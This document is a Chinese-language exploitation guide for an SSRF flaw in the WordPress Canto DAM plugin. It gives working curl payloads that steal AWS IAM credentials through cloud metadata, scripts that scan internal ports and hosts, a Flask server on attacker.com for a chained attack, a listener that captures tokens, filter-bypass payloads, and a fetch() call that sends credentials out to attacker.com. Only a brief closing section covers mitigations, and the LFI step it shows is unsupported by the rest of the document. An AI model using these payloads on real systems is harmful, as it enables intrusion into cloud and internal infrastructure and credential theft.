# WordPress Canto 插件 SSRF 攻击

## 1. 概述

### 1.1 漏洞描述

WordPress Canto Digital Asset Management (DAM) 插件 v3.0.4 的多个 PHP 库文件存在严重的服务器端请求伪造 (SSRF) 漏洞。这些文件接受用户可控的 `subdomain`、`app_api`、`fbc_flight_domain`、`fbc_app_api` 参数，并将其直接拼接到 HTTPS URL 中发起 outbound HTTP 请求，导致攻击者可以强制服务器访问任意内部或外部资源。

### 1.2 受影响组件

| 文件路径 | 漏洞参数 | 代码位置 | 请求类型 |
|---------|---------|---------|---------|
| `/wp-content/plugins/canto/includes/lib/get.php` | `subdomain`, `app_api` | 第 8-9 行，31-43 行 | GET (非盲注) |
| `/wp-content/plugins/canto/includes/lib/download.php` | `subdomain`, `app_api` | 第 7-8 行，15 行 | GET (非盲注) |
| `/wp-content/plugins/canto/includes/lib/detail.php` | `subdomain`, `app_api` | 第 6-7 行，13 行 | GET (非盲注) |
| `/wp-content/plugins/canto/includes/lib/tree.php` | `subdomain`, `app_api` | 第 8-9 行，15-17 行 | GET (非盲注) |
| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `fbc_flight_domain`, `fbc_app_api` | 第 70-71 行，86-91 行 | GET (多阶段 SSRF) |

### 1.3 漏洞成因

Canto 插件设计用于与 Canto DAM API (`*.canto.com`) 通信，但未对 API 端点进行任何白名单验证。用户可控的 URL 组件直接拼接到 HTTP 请求中：

**脆弱代码模式：**
```php
// 脆弱代码示例 (get.php 第 8-9 行，31-43 行)
$subdomain = sanitize_text_field($_REQUEST['subdomain']);
$app_api = sanitize_text_field($_REQUEST['app_api']);

// 直接拼接 URL，无验证
$url = 'https://' . $subdomain . '.' . $app_api . '/api/v1/search?...';

// 发起请求
$response = wp_remote_get($url, array('timeout' => 120));
```

### 1.4 前置条件

- WordPress 6.5.4 安装 Canto DAM 插件 v3.0.4
- 任意 WordPress 用户账户（包括 Subscriber 最低权限）
- 无需管理员权限
- 无需 nonce 验证
- 无速率限制

### 1.5 影响等级

**CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` - **8.2 HIGH**

---

## 2. 漏洞探测

### 2.1 端点识别

**目标端点列表：**
```bash
# 需要 WordPress 认证（任意角色）
GET/POST /wp-content/plugins/canto/includes/lib/get.php
GET/POST /wp-content/plugins/canto/includes/lib/download.php
GET/POST /wp-content/plugins/canto/includes/lib/detail.php
GET/POST /wp-content/plugins/canto/includes/lib/tree.php
POST    /wp-content/plugins/canto/includes/lib/copy-media.php
```

**端点访问测试：**
```bash
# 登录获取会话 Cookie
curl -c cookies.txt -X POST "http://target/wp-login.php" \
  -d "log=[username]&pwd=[password]"

# 测试 SSRF 端点可访问性
curl -b cookies.txt -I "http://target/wp-content/plugins/canto/includes/lib/get.php"
# 预期：HTTP 200 或 500（取决于参数）
```

### 2.2 SSRF 漏洞验证

**基础测试 Payload：**
```bash
# 测试 get.php 的 SSRF
curl -b cookies.txt -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=example&app_api=com&token=test"

# 预期：返回 Canto API 响应（或错误）
# 如果返回正常 JSON，说明 SSRF 可利用
```

**外部服务器测试：**
```bash
# 在攻击者服务器监听
nc -lvnp 80

# 触发 SSRF 到攻击者服务器
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=attacker&app_api=com:80&token=test"

# 预期：攻击者服务器收到来自目标的请求
# User-Agent: "Wordpress Plugin" 或 "WordPress/6.5.4"
# Authorization: Bearer [token]
```

### 2.3 盲注 vs 非盲注判断

**非盲注 SSRF 测试：**
```bash
# get.php 返回完整响应体
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/latest/meta-data&token=test"

# 如果返回云元数据内容，说明是非盲注 SSRF
# 响应包含：ami-id, instance-id, local-hostname 等
```

---

## 3. 漏洞利用方法

### 3.1 云元数据服务访问

**AWS EC2 元数据访问：**
```bash
# 访问 AWS 元数据服务（非盲注）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/latest/meta-data&token=test"

# 预期输出：
# ami-id
# ami-launch-index
# ami-manifest-path
# hostname
# instance-id
# local-hostname
# public-hostname
# public-keys/
# reservation-id
```

**提取 AWS IAM 凭证：**
```bash
# 获取 IAM 角色名称
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/latest/meta-data/iam/security-credentials/&token=test"

# 获取具体凭证（替换 [ROLE_NAME]）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/latest/meta-data/iam/security-credentials/[ROLE_NAME]&token=test"

# 预期输出：
# {
#   "Code": "Success",
#   "LastUpdated": "2024-01-01T00:00:00Z",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-02T00:00:00Z"
# }
```

**GCP 元数据访问：**
```bash
# 访问 GCP 元数据服务
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&subdomain=metadata.google&app_api=internal&scheme=computeMetadata&id=v1/instance/service-accounts/default/token"

# 需要添加 Metadata-Flavor 头（SSRF 无法自定义头，但可直接访问）
# 替代方案：访问 instance 信息
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&subdomain=metadata.google&app_api=internal&scheme=computeMetadata&id=v1/instance/hostname"
```

**Azure 元数据访问：**
```bash
# 访问 Azure 元数据服务
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/metadata/instance?api-version=2021-02-01&token=test"
```

### 3.2 内网端口扫描

**单端口扫描：**
```bash
# 扫描 MySQL 端口 (3306)
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:3306&id=test"

# 响应分析：
# - 连接超时：端口关闭或防火墙阻止
# - 连接拒绝：端口关闭
# - 返回服务 Banner：端口开放
```

**批量端口扫描脚本：**
```bash
#!/bin/bash
TARGET="http://target"
COOKIE="cookies.txt"
ENDPOINT="/wp-content/plugins/canto/includes/lib/download.php"
IP="127.0.0.1"

for port in 21 22 23 25 53 80 110 143 443 993 995 3306 3389 5432 5900 6379 8080 8443 9000 9200 27017; do
    response=$(curl -b $COOKIE -s -m 2 "${TARGET}${ENDPOINT}?wp_abspath=/var/www/html&subdomain=${IP}&app_api=:${port}&id=test" 2>&1)
    if [[ "$response" != *"Connection refused"* ]] && [[ "$response" != *"cURL error"* ]]; then
        echo "[+] Port ${port} may be OPEN"
        echo "Response: $response"
    fi
done
```

**内网主机扫描：**
```bash
#!/bin/bash
TARGET="http://target"
COOKIE="cookies.txt"
ENDPOINT="/wp-content/plugins/canto/includes/lib/get.php"

# 扫描 192.168.1.0/24 网段
for i in $(seq 1 254); do
    response=$(curl -b $COOKIE -s -m 2 "${TARGET}${ENDPOINT}?wp_abspath=/var/www/html&subdomain=192.168.1.${i}&app_api=com&token=test" 2>&1)
    if [[ "$response" != *"Connection refused"* ]] && [[ "$response" != *"cURL error"* ]]; then
        echo "[+] Host 192.168.1.${i} may be alive"
    fi
done
```

### 3.3 内部服务探测

**Redis 服务探测：**
```bash
# 访问本地 Redis (6379)
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:6379&token=test"

# 如果 Redis 开放，可能返回 Redis 响应或错误
```

**MySQL 服务探测：**
```bash
# 访问本地 MySQL (3306)
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:3306&id=test"

# MySQL 可能返回协议错误（表明端口开放）
```

**Elasticsearch 服务探测：**
```bash
# 访问 Elasticsearch (9200)
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:9200&token=test"

# 如果 Elasticsearch 开放，可能返回集群信息
```

**Docker 守护进程探测：**
```bash
# 访问 Docker Socket (如果暴露为 HTTP)
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:2375&token=test"

# 访问 Docker API
curl -b cookies.txt -m 5 "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:2375/containers/json&token=test"
```

### 3.4 多阶段 SSRF 链（copy-media.php）

**场景：** copy-media.php 支持从第一个 SSRF 响应中提取 URL，然后发起第二个 SSRF 请求。

**步骤 1：设置恶意服务器**
```python
# attacker.com/ssrf_chain.py
from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/api/v1/<path:path>')
def ssrf_stage1(path):
    # 第一阶段：返回包含目标 URL 的响应
    return jsonify({
        "url": {
            "download": "http://169.254.169.254/latest/meta-data/iam/security-credentials/default"
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

**步骤 2：触发多阶段 SSRF**
```bash
# 攻击者触发 SSRF 链
curl -b cookies.txt -X POST "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "abspath=/var/www/html" \
  -d "fbc_flight_domain=attacker" \
  -d "fbc_app_api=com" \
  -d "fbc_scheme=api" \
  -d "fbc_id=v1" \
  -d "fbc_app_token=test" \
  -d "post_id=1"

# 流程：
# 1. WordPress 请求 attacker.com/api/v1/api/v1
# 2. 攻击者返回包含 169.254.169.254 URL 的 JSON
# 3. WordPress 请求 169.254.169.254（第二阶段 SSRF）
# 4. AWS 凭证被下载并写入服务器
```

### 3.5 凭证窃取

**窃取 OAuth Bearer Token：**
```bash
# 在攻击者服务器监听
nc -lvnp 443

# 触发 SSRF 到攻击者服务器
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=attacker&app_api=com:443&token=test"

# 预期：收到包含 Authorization 头的请求
# Authorization: Bearer [legitimate_canto_token]
# 攻击者可以重放此令牌访问受害者 Canto 账户
```

---

## 4. 绕过技术

### 4.1 IP 过滤绕过

**绕过 localhost 过滤：**
```bash
# 使用十进制 IP
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=2130706433&app_api=com&token=test"
# 2130706433 = 127.0.0.1

# 使用八进制 IP
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=0177.0.0.1&app_api=com&token=test"

# 使用十六进制 IP
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=0x7f.0x00.0x00.0x01&app_api=com&token=test"

# 使用 DNS 重绑定
# 注册域名 evil.com，配置 DNS 返回 8.8.8.8（首次解析）
# 然后返回 127.0.0.1（第二次解析）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=evil&app_api=com&token=test"
```

**绕过 CIDR 过滤：**
```bash
# 使用 IPv6 映射 IPv4
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=[::ffff:7f00:1]&app_api=com&token=test"

# 使用 IPv6 localhost
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=[::1]&app_api=com&token=test"
```

### 4.2 协议绕过

**使用 file:// 协议（如果支持）：**
```bash
# 读取本地文件
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=file://&app_api=/etc/passwd&token=test"
```

**使用 gopher://协议（如果支持）：**
```bash
# 通过 gopher 访问 Redis
# gopher://127.0.0.1:6379/_INFO%20command
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=gopher://&app_api=127.0.0.1:6379&token=test"
```

### 4.3 URL 结构绕过

**利用 URL 解析差异：**
```bash
# 使用 @ 符号（URL .userInfo 被忽略）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=attacker.com@127.0.0.1&app_api=com&token=test"

# 使用 # 片段（# 后内容被忽略）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=com#@attacker.com&token=test"

# 使用？查询参数混淆
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1?attacker.com&app_api=com&token=test"
```

---

## 5. 组合攻击场景

### 5.1 SSRF + LFI 组合攻击

**场景：** 使用 SSRF 探测内部网络，然后使用 LFI 读取敏感文件

**步骤 1：SSRF 探测内部服务**
```bash
# 发现内部 Redis 服务
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=192.168.1&app_api=100:6379&token=test"
```

**步骤 2：LFI 读取配置文件获取凭证**
```bash
# 读取数据库凭证
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
```

### 5.2 SSRF + XSS 组合攻击

**场景：** 使用 SSRF 获取敏感数据，然后通过 XSS 外带

**步骤 1：SSRF 获取元数据**
```bash
# 获取 AWS 凭证
metadata=$(curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=254/latest/meta-data/iam/security-credentials/default&token=test")
```

**步骤 2：通过 XSS 外带**
```javascript
// 在受害者浏览器执行
fetch('https://attacker.com/exfil?creds=' + encodeURIComponent('[metadata]'));
```

### 5.3 SSRF + 认证绕过组合攻击

**场景：** 使用 SSRF 访问内部认证端点

**步骤 1：SSRF 访问内部 admin 端点**
```bash
# 访问内部管理服务（假设在 8080 端口）
curl -b cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:8080/admin&token=test"
```

---

## 6. 自动化工具

### 6.1 使用 SSRFmap

```bash
# 自动化 SSRF 探测和利用
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
python3 ssrfmap.py -U http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=FUZZ&app_api=com&token=test -m portscan
```

### 6.2 使用 Gopherus

```bash
# 生成 gopher SSRF payload
python3 gopherus.py --exploit
```

### 6.3 自定义扫描脚本

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

target = "http://target/wp-content/plugins/canto/includes/lib/"
cookies = {"wordpress_logged_in_hash": "stolen_session"}
vulnerable_files = ["get.php", "download.php", "detail.php", "tree.php"]

# 云元数据测试
cloud_targets = [
    ("169.254.169.254", "latest/meta-data/", "AWS"),
    ("metadata.google.internal", "computeMetadata/v1/", "GCP"),
]

for file in vulnerable_files:
    for ip, path, provider in cloud_targets:
        url = f"{target}{file}?wp_abspath=/var/www/html&subdomain={ip}&app_api={path}&token=test"
        try:
            response = requests.get(url, cookies=cookies, timeout=10)
            if response.status_code == 200 and len(response.text) > 100:
                print(f"[+] {provider} metadata accessible via {file}")
                print(response.text[:500])
        except Exception as e:
            print(f"[-] {file} -> {provider}: {e}")
```

---

## 7. 缓解措施

### 7.1 立即修复

**实施 URL 白名单：**
```php
// 修复 SSRF 漏洞
$allowed_domains = ['canto.com', 'canto.global', 'canto.de'];

$subdomain = sanitize_text_field($_REQUEST['subdomain']);
$app_api = sanitize_text_field($_REQUEST['app_api']);

// 验证域名
$parsed_url = parse_url('https://' . $subdomain . '.' . $app_api);
$host = $parsed_url['host'];

$domain_valid = false;
foreach ($allowed_domains as $allowed) {
    if ($host === $allowed || str_ends_with($host, '.' . $allowed)) {
        $domain_valid = true;
        break;
    }
}

if (!$domain_valid) {
    wp_die('Invalid Canto domain');
}
```

**禁用不必要的协议：**
```php
// 在 WordPress 中禁用 file:// 和 gopher:// 协议
add_filter('http_request_args', function($args, $url) {
    $parsed = parse_url($url);
    if (in_array($parsed['scheme'], ['file', 'gopher', 'dict', 'ftp'])) {
        return new WP_Error('ssrf_blocked', 'Protocol not allowed');
    }
    return $args;
}, 10, 2);
```

### 7.2 网络层防护

**防火墙规则：**
```bash
# 阻止访问云元数据服务
iptables -A OUTPUT -d 169.254.169.254 -j DROP
iptables -A OUTPUT -d metadata.google.internal -j DROP

# 阻止访问内网范围
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

---

## 8. 参考资源

- [OWASP Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [SSRF 利用技术指南](https://www.hackerone.com/blog-ssrf)
- [云元数据服务安全](https://cloud.google.com/compute/docs/storing-retrieving-metadata)